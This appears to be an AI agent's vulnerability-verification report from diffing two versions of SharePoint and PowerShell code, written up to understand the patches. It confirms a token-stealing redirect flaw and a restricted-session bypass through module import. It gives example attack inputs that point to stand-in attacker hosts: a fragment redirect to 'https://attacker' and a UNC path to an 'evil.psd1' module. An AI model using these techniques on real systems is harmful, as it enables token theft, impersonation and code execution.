Agent: Codex-GPT-5
Timestamp: 2025-11-19 15:42:06 UTC

# Final Verification Results

## 1. ProofTokenSignInPage redirect fragment leak
**Diff evidence:** `diff_reports/v1-to-v2.server-side.patch`, ProofTokenSignInPage.cs (`ShouldRedirectWithProofToken`).
```
 	result = IsAllowedRedirectUrl(RedirectUri);
+	if ((!((SPPersistedObject)(object)SPFarm.Local != (SPPersistedObject)null) || !SPFarm.Local.ServerDebugFlags.Contains(53020)) && !string.IsNullOrEmpty(RedirectUri.Fragment))
+	{
+		ULS.SendTraceTag(..., "[ProofTokenSignInPage] Hash parameter is not allowed.");
+		result = false;
+	}
```

**V1 behavior:**
- `redirect_uri` is read directly from the query string and converted to `Uri` without sanitizing fragments (`snapshots_decompiled/v1/Microsoft.-1bae7604-1834fb48/Microsoft/SharePoint/IdentityModel/ProofTokenSignInPage.cs:45-66`).
- `FormActionValue` returns the raw `RedirectUri.OriginalString` whenever `ShouldRedirectWithProofToken()` returns true (`lines 68-90`).
- `ShouldRedirectWithProofToken()` only called `IsAllowedRedirectUrl` and otherwise accepted the URI (`lines 315-323`).
- `silentsignin.aspx` posts `ProofToken` and `IdentityToken` automatically to that URL on load (`snapshots_norm/v1/.../silentsignin.aspx:26-54`).
- Because fragments were never rejected, an attacker could set `redirect_uri=https://tenant/_layouts/15/start.aspx#next=https://attacker`. The page issued new proof & identity tokens, auto-posted them to `_layouts/15/start.aspx`, and that ASPX page could read `window.location.hash` to bounce the browser (and the still-live proof token) to `https://attacker`, allowing token theft and full impersonation.

**V2 behavior:**
- The fragment check above rejects redirect URIs containing a hash unless debug flag 53020 overrides it. Tokens are no longer sent to fragment-bearing URLs, preventing the described exfiltration path.

**Confidence:** High – the entire data flow (query parameter ➜ `FormActionValue` ➜ auto-post) is visible in the provided sources.

## 2. ShowCommandCommand unrestricted module import
**Diff evidence:** `diff_reports/v1-to-v2.server-side.patch`, ShowCommandCommand.cs (`WaitForWindowClosedOrHelpNeeded`).
```
@@ -399,6 +399,12 @@ private void WaitForWindowClosedOrHelpNeeded()
+	string path = FileSystemProvider.NormalizePath(...ParentModuleNeedingImportModule);
+	if (Utils.IsSessionRestricted(base.Context) && (FileSystemProvider.NativeMethods.PathIsNetworkPath(path) || Utils.PathIsDevicePath(path)))
+	{
+		ErrorRecord errorRecord = new ErrorRecord(new ArgumentException(HelpErrors.NoNetworkCommands, "Name"), ...);
+		ThrowTerminatingError(errorRecord);
+	}
 	string importModuleCommand = showCommandProxy.GetImportModuleCommand(...);
```
`diff_reports/.../Utils.cs` simultaneously adds `IsSessionRestricted` and `PathIsDevicePath` helpers used here.

**V1 behavior:**
- In `snapshots_decompiled/v1/Microsoft.-056c3798-daa17c9d/Microsoft/PowerShell/Commands/ShowCommandCommand.cs:387-415`, the cmdlet immediately executed `InvokeScript(importModuleCommand)` once the GUI requested it. There were no path checks or session checks.
- Restricted sessions (Constrained Language Mode, remote constrained runspaces, etc.) normally block importing modules from UNC or device paths. Show-Command bypassed those policy gates since it generated and executed an import command itself.
- An attacker with Show-Command access in such a session could point the GUI at `\\attacker\share\evil.psd1` (or `\\?\GLOBALROOT\...`), causing arbitrary module import despite the lock-down, leading to code execution with the victim’s privileges.

**V2 behavior:**
- Before importing, the cmdlet normalizes the provider path and, if `Utils.IsSessionRestricted` returns true and the path is UNC/device-based, throws `CommandNameNotAllowed` instead of importing. That enforces the same network/device restrictions that the rest of PowerShell uses, closing the bypass.

**Confidence:** High – the diff shows the guard and its helper functions, and the v1 code clearly lacked any validation.

## 3. CustomClassificationOM tenant enforcement
**Diff evidence:** New code in `diff_reports/v1-to-v2.server-side.patch` (CustomClassificationOM.cs) introduces tenant-ID rewriting:
```
+   if (!SPKillSwitch.IsActivated(BugFixForDifferentTenantIdKillSwitch, ...))
+   {
+       definition = ClassificationSyncFileMetaData.ReplaceTenantElement(definition, spSiteSubscriptionId);
+   }
```
This file only exists in the v2 snapshot; there is no v1 implementation available for comparison. Without the prior code, I cannot determine whether this addition fixes a security flaw or simply adds functionality.

**Confidence:** Unproven/speculative – the evidence is insufficient to prove a vulnerability was fixed.

## 4. Search schema import/export collision handling
**Diff evidence:** `diff_reports/v1-to-v2.server-side.patch`, SchemaOperations.cs
```
+   private static readonly Guid KillSwitchEnsureCheckAliasSchemaId = ...;
...
+           flag = !managedPropertyInfo.Name.Equals(property.Name);
+           ULS.SendTraceTag(... "KillSwitchEnsureCheckAliasSchemaId is active ...");
+       }
+       if (flag)
+       {
+           warnings.Add(...);
+           newPids.Add(property.Pid, -1);
+           return;
+       }
```
Again, this code block appears only in the v2 snapshot (the entire class is new), so no pre-existing behavior is visible.

**Confidence:** Unproven/speculative.

## 5. SPList validation formula attribute move
**Diff evidence:** `diff_reports/v1-to-v2.server-side.patch`, SPList.cs (`Update`)
```
-   [ClientCallableExceptionConstraint(... "formula1" ...)]
    [ClientCallableExceptionConstraint(FixedId = "c", ...)]
    [ClientCallable]
    [ClientCallableExceptionConstraint(FixedId = "versionmismatch", ...)]
+   [ClientCallableExceptionConstraint(FixedId = "formula1", ...)]
    public void Update()
```
The `formula1` exception attribute was simply moved after another attribute; there is no functional code change tied to it.

**Confidence:** Unproven/speculative – no evidence of a vulnerability in the provided code.

## Coverage check – security-looking changes not mapped to confirmed issues
1. **CustomClassificationOM.cs** – new Data Loss Prevention helper that rewrites tenant IDs and enforces size/ID limits; unknown whether it addresses a vulnerability.
2. **Search administration classes** (`BaseInfoCollection.cs`, `SchemaOperations.cs`, `BestBet.cs`, etc.) – entirely new files with permission demands, duplicate-name detection, and kill-switch-based validation; unknown whether they fix security bugs.
3. **SPList.cs attribute ordering** – reorders `ClientCallableExceptionConstraint` declarations; unknown if security-motivated.

## Final status of all previously claimed issues
| Vulnerability | Status |
| --- | --- |
| ProofTokenSignInPage fragment-based redirect leak | **Confirmed** |
| ShowCommandCommand unrestricted module import | **Confirmed** |
| CustomClassificationOM tenant enforcement | **Uncertain** (no v1 code to compare) |
| Search schema import/export collision handling | **Uncertain** (entire class new in v2) |
| SPList validation formula attribute move | **Uncertain** (attribute reorder only) |
